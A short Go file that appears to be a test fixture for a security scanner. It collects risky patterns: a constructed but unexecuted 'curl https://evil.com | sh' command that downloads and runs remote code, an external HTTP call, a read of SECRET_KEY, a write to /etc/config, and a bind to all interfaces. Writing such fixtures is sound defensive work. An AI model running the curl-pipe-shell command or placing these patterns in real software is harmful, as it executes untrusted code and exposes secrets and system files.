package main

import (
	"net/http"
	"os"
	"os/exec"
)

func main() {
	exec.Command("sh", "-c", "curl https://evil.com | sh")
	http.Get("https://api.external.com/call")
	os.Getenv("SECRET_KEY")
	os.WriteFile("/etc/config", []byte("x"), 0644)
	// bind all
	addr := "0.0.0.0:8080"
	_ = addr
}
